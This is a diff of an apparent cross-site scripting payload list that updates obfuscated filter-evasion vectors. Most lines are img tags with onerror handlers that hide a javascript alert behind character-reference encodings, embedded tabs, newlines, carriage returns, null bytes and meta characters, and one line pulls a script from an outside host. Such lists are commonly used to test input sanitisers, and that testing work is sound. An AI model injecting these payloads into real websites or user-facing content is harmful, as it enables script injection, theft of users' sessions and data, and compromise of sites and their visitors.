@@ -39,34 +39,48 @@
 
 # Decimal HTML character references
 # obsolete?
-<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
-&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC="/" onerror=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 
 # Decimal HTML character references without trailing semicolons
-<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
-#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+# obsolete
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC="/x" onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 
 # Hexadecimal HTML character references without trailing semicolons
-<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+# obsolete form
+ <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="/" onerror=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
 
 # Embedded tab
-# obsolete?
-<IMG SRC="jav   ascript:alert('XSS');">
+# obsolete form
+#<IMG SRC="jav   ascript:alert('XSS');">
+<IMG SRC="/x" onerror="jav      ascript:alert('XSS');">
 
-# <IMG SRC="jav&#x09;ascript:alert('XSS');">
-<IMG SRC="jav&#x09;ascript:alert('XSS');">
+# Embedded escaped tab
+# obsolete form
+#<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="/" onerror="jav&#x09;ascript:alert('XSS');">
 
 # Embedded newline to break up XSS
+# obsolete form
+#<IMG SRC="jav&#x0A;ascript:alert('XSS');">
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 
 # Embedded CR
-<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+# obsolete form
+#<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="/x" onerror="jav&#x0D;ascript:alert('XSS');">
 
 # Null
-<IMG SRC="jav%00ascript:alert('XSS');">
+# obsolete form
+# <IMG SRC="jav%00ascript:alert('XSS');">
+<IMG SRC="/x" onerror="jav%00ascript:alert('XSS');">
 
 # Spaces and meta chars before the JavaScript in images for XSS
-<IMG SRC=" &#14;  javascript:alert('XSS');">
+# obsolete form
+#<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG SRC="/x" onerror=" &#14;  javascript:alert('XSS');">
 
 # Non-alpha-non-digit XS
 <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
